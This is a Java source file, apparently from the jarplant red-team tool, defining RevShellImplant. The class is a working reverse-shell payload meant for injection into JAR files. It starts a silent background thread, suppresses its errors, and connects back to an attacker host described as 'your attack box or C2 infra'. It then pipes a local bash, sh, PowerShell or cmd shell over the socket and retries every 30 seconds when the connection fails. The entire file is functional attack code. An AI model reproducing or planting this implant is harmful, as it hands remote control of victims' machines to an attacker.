package io.github.w1th4d.jarplant.implants;

import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;
import java.nio.file.Files;
import java.nio.file.Path;
import java.time.Duration;
import java.util.Arrays;
import java.util.List;
import java.util.Optional;

public class RevShellImplant implements Runnable, Thread.UncaughtExceptionHandler {
    // Standard config fields from ClassImplant template:
    static volatile String CONF_JVM_MARKER_PROP = "java.class.init";
    static volatile boolean CONF_BLOCK_JVM_SHUTDOWN = false;
    static volatile int CONF_DELAY_MS = 0;

    /**
     * Hostname, IPv4 address or IPv6 address to connect back to.
     * This should be your attack box or C2 infra.
     */
    static volatile String CONF_LHOST = "localhost";

    /**
     * TCP port number to use when connecting back.
     */
    static volatile int CONF_LPORT = 12345;

    /**
     * Amount of seconds to wait between connection attempts.
     */
    static volatile int CONF_RETRY_WAIT_SECONDS = 30;

    @SuppressWarnings("unused")
    public static void init() {
        if (System.getProperty(CONF_JVM_MARKER_PROP) == null) {
            if (System.setProperty(CONF_JVM_MARKER_PROP, "true") == null) {
                RevShellImplant implant = new RevShellImplant();
                Thread background = new Thread(implant);
                background.setDaemon(!CONF_BLOCK_JVM_SHUTDOWN);
                background.setUncaughtExceptionHandler(implant);
                background.start();
            }
        }
    }

    @Override
    public void run() {
        if (CONF_DELAY_MS > 0) {
            try {
                Thread.sleep(CONF_DELAY_MS);
            } catch (InterruptedException ignored) {
            }
        }

        payload();
    }

    @Override
    public void uncaughtException(Thread thread, Throwable throwable) {
        // Silently ignore (don't throw up error messages on stderr)
    }

    private void payload() {
        if (CONF_LHOST == null || CONF_LHOST.isEmpty()) {
            return;
        }

        Optional<Path> shellCommand = findShellExecutable();
        if (shellCommand.isEmpty()) {
            System.out.println("[!] Cannot find shell executable!");
            return;
        }

        while (!Thread.interrupted()) {
            System.out.println("[$] Connecting to " + CONF_LHOST + ":" + CONF_LPORT + "...");
            try (Socket connection = new Socket(CONF_LHOST, CONF_LPORT)) {
                InputStream fromRemote = connection.getInputStream();
                OutputStream toRemote = connection.getOutputStream();
                System.out.println("[+] Connected to " + CONF_LHOST + ":" + CONF_LPORT + "!");

                Process shell = new ProcessBuilder()
                        .command(shellCommand.get().toAbsolutePath().toString())
                        .redirectErrorStream(true)
                        .start();
                InputStream fromShell = shell.getInputStream();
                OutputStream toShell = shell.getOutputStream();
                System.out.println("[$] Shell popped with PID " + shell.pid() + ".");

                Thread pipe1 = new Thread(() -> {
                    transfer(fromShell, toRemote);
                });
                pipe1.start();

                Thread pipe2 = new Thread(() -> {
                    transfer(fromRemote, toShell);
                });
                pipe2.start();

                System.out.println("[ ] Waiting...");
                pipe1.join();
                pipe2.join();

                shell.destroy();
                System.out.println("[ ] Terminated.");
            } catch (IOException e) {
                System.out.println("[!] " + e.getClass().getName() + ": " + e.getMessage());
                try {
                    Thread.sleep(Duration.ofSeconds(CONF_RETRY_WAIT_SECONDS).toMillis());
                } catch (InterruptedException ignored) {
                    Thread.currentThread().interrupt();
                }
            } catch (InterruptedException ignored) {
                Thread.currentThread().interrupt();
            }
        }
    }

    /**
     * Transfer all data from one stream to another.
     * No string/text interpretation will be done. Just raw bytes.
     * This method blocks and returns only if the streams are closed, or the current thread is interrupted.
     *
     * @param input  from
     * @param output to
     */
    private static void transfer(InputStream input, OutputStream output) {
        byte[] buffer = new byte[256];
        while (!Thread.interrupted()) {
            try {
                int readAmount = input.read(buffer);
                if (readAmount == -1) {
                    break;
                }
                output.write(buffer, 0, readAmount);
                output.flush();
                System.out.print(".");
                System.out.flush();
            } catch (IOException e) {
                break;
            }
        }

        try {
            input.close();
            output.close();
        } catch (IOException ignored) {
        }
    }

    /**
     * Find the most preferred shell.
     *
     * @return maybe a path to an executable file
     */
    private static Optional<Path> findShellExecutable() {
        String osName = System.getProperty("os.name").toLowerCase();
        if (osName.startsWith("windows")) {
            String pathEnv = System.getenv("PATH");
            return findWindowsShellExecutable(pathEnv);
        } else if (osName.startsWith("linux")) {
            return findUnixShellExecutable();
        } else if (osName.startsWith("mac")) {
            return findUnixShellExecutable();
        } else {
            return Optional.empty();
        }
    }

    static Optional<Path> findUnixShellExecutable() {
        List<Path> candidates = Arrays.asList(
                Path.of("/bin/bash"),
                Path.of("/bin/zsh"),
                Path.of("/bin/sh")
        );
        for (Path candidate : candidates) {
            if (Files.exists(candidate) && Files.isExecutable(candidate)) {
                return Optional.of(candidate);
            }
        }

        return Optional.empty();
    }

    static Optional<Path> findWindowsShellExecutable(String pathEnv) {
        if (pathEnv == null || pathEnv.isEmpty()) {
            return Optional.empty();
        }

        Optional<Path> powershell = Optional.empty();
        Optional<Path> cmd = Optional.empty();

        String[] binPaths = pathEnv.split(File.pathSeparator);
        for (String binPath : binPaths) {
            Path path = Path.of(binPath);
            if (Files.exists(path) && Files.isDirectory(path)) {
                if (powershell.isEmpty()) {
                    Path candidate = path.resolve("powershell.exe");
                    if (Files.exists(candidate) && Files.isExecutable(candidate)) {
                        powershell = Optional.of(candidate);
                    }
                }

                if (cmd.isEmpty()) {
                    Path candidate = path.resolve("cmd.exe");
                    if (Files.exists(candidate) && Files.isExecutable(candidate)) {
                        cmd = Optional.of(candidate);
                    }
                }
            }
        }

        if (powershell.isPresent()) {
            return powershell;
        } else if (cmd.isPresent()) {
            return cmd;
        } else {
            return Optional.empty();
        }
    }

    public static void main(String[] args) {
        RevShellImplant implant = new RevShellImplant();
        implant.payload();
    }
}
